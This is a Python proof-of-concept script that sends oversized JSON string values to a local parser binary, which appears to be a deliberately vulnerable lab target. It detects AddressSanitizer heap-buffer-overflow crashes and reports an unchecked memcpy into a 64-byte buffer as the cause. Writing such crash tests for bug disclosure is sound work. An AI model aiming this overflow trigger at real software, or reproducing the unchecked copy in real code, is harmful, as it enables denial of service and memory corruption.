#!/usr/bin/env python3
"""
Proof-of-Concept: Heap Buffer Overflow in vuln_parser
"""

import subprocess
import sys
import os

RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
RESET = '\033[0m'

def create_payload(size=100):
    payload = '{"data": "' + 'A' * size + '"}'
    return payload

def test_crash(target_path, payload, test_name="Overflow Test"):
    print(f"\n{BLUE}[*] {test_name}{RESET}")
    print(f"{YELLOW}[*] Payload size: {len(payload)} bytes{RESET}")
    print(f"{YELLOW}[*] Value length: {len(payload.split('\"')[3])} characters{RESET}")
    
    temp_file = "/tmp/poc_crash.json"
    with open(temp_file, 'w') as f:
        f.write(payload)
    
    try:
        result = subprocess.run(
            [target_path, temp_file],
            timeout=2,
            capture_output=True  # FIXED: removed stderr parameter
        )
        
        stderr = result.stderr.decode('utf-8', errors='ignore')
        
        if b"AddressSanitizer" in result.stderr:
            print(f"{RED}[!] CRASH DETECTED: AddressSanitizer triggered{RESET}")
            print(f"{RED}[!] Return code: {result.returncode}{RESET}")
            
            if "heap-buffer-overflow" in stderr:
                print(f"{RED}[!] Type: Heap Buffer Overflow{RESET}")
            
            for line in stderr.split('\n'):
                if 'extract_string' in line or 'SUMMARY' in line:
                    print(f"{YELLOW}    {line}{RESET}")
            
            return True
        else:
            print(f"{GREEN}[+] No crash (return code: {result.returncode}){RESET}")
            return False
            
    except subprocess.TimeoutExpired:
        print(f"{RED}[!] CRASH DETECTED: Process timeout{RESET}")
        return True
    except Exception as e:
        print(f"{RED}[!] Error: {e}{RESET}")
        return False

def main():
    print(f"{BLUE}{'='*60}{RESET}")
    print(f"{BLUE}  Heap Buffer Overflow PoC - vuln_parser{RESET}")
    print(f"{BLUE}{'='*60}{RESET}")
    
    target_path = "target/vuln_json/vuln_parser"
    
    if not os.path.exists(target_path):
        print(f"{RED}[!] Error: Target not found at {target_path}{RESET}")
        sys.exit(1)
    
    print(f"{GREEN}[+] Target found: {target_path}{RESET}")
    
    # Test 1: Normal (50 bytes)
    print(f"\n{BLUE}{'='*60}{RESET}")
    print(f"{BLUE}Test 1: Normal Input (Control){RESET}")
    print(f"{BLUE}{'='*60}{RESET}")
    test_crash(target_path, create_payload(50), "Control: 50-byte value")
    
    # Test 2: Edge (63 bytes)
    print(f"\n{BLUE}{'='*60}{RESET}")
    print(f"{BLUE}Test 2: Edge Case{RESET}")
    print(f"{BLUE}{'='*60}{RESET}")
    test_crash(target_path, create_payload(63), "Edge: 63-byte value")
    
    # Test 3: Minimal overflow (65 bytes)
    print(f"\n{BLUE}{'='*60}{RESET}")
    print(f"{BLUE}Test 3: Minimal Overflow (EXPLOIT){RESET}")
    print(f"{BLUE}{'='*60}{RESET}")
    crashed_min = test_crash(target_path, create_payload(65), "Exploit: 65-byte value (1 byte overflow)")
    
    # Test 4: Large overflow (100 bytes)
    print(f"\n{BLUE}{'='*60}{RESET}")
    print(f"{BLUE}Test 4: Large Overflow (EXPLOIT){RESET}")
    print(f"{BLUE}{'='*60}{RESET}")
    crashed_large = test_crash(target_path, create_payload(100), "Exploit: 100-byte value (36 byte overflow)")
    
    # Test 5: Massive overflow (500 bytes)
    print(f"\n{BLUE}{'='*60}{RESET}")
    print(f"{BLUE}Test 5: Massive Overflow (EXPLOIT){RESET}")
    print(f"{BLUE}{'='*60}{RESET}")
    crashed_huge = test_crash(target_path, create_payload(500), "Exploit: 500-byte value (436 byte overflow)")
    
    print(f"\n{BLUE}{'='*60}{RESET}")
    print(f"{BLUE}  SUMMARY{RESET}")
    print(f"{BLUE}{'='*60}{RESET}")
    
    if crashed_min or crashed_large or crashed_huge:
        print(f"{RED}[!] VULNERABILITY CONFIRMED{RESET}")
        print(f"{RED}[!] Heap buffer overflow triggered with inputs > 64 bytes{RESET}")
        print(f"\n{YELLOW}Root Cause:{RESET}")
        print(f"  - Function: extract_string() at vuln_parser.c:61")
        print(f"  - Issue: memcpy() with unchecked length into fixed 64-byte buffer")
        print(f"  - Impact: Memory corruption, DoS, potential RCE")
    else:
        print(f"{GREEN}[+] No crashes detected (unexpected){RESET}")
    
    print(f"\n{BLUE}{'='*60}{RESET}")
    print(f"{BLUE}  PoC Complete{RESET}")
    print(f"{BLUE}{'='*60}{RESET}\n")

if __name__ == "__main__":
    main()
